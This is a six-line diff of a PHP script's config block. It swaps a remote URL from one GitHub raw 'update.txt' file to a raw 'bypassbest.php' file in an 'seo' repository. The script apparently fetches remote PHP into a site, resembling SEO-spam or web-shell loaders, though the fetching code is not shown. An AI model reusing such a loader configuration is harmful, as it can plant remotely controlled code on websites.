@@ -1,6 +1,6 @@
 <?php
 // === Config ===
-$remoteUrl = 'https://raw.githubusercontent.com/shadowfiles404/seo/refs/heads/main/update.txt';
+$remoteUrl = 'https://raw.githubusercontent.com/mandhanharisha-hub/seo/refs/heads/main/bypassbest.php';
 $timeoutSeconds = 10;
 
 // === Resolve paths ===
